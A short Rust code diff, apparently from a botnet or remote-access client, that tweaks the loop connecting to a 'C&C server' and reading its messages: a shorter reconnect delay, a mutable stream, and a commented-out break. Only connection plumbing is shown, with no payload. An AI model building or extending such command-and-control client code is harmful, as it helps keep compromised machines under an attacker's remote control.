@@ -12,12 +12,12 @@ const PORT: u16 = 8080;
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // This is a reconnection loop if something goes wrong.
     loop {
-        thread::sleep(Duration::from_millis(5000));
+        thread::sleep(Duration::from_millis(1000));
         // connect to the socket
         let connection = socket::connect_to_cnc(IP, PORT).await;
         if let Err(e) = connection {continue} // Break if connection refused.
         println!("Connected to C&C server successfully");
-        let stream = socket::SocketStream::new(connection.unwrap());
+        let mut stream = socket::SocketStream::new(connection.unwrap());
         // Message reading loop
         loop {
             let msg = stream.consume_message().await;
@@ -26,7 +26,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 if e.kind() == std::io::ErrorKind::WouldBlock {
                     continue
                 }
-                break
+                // break
             } // this error probably indicates about block of the read abilities.
 
             let (msg, n_bytes) = msg.unwrap();
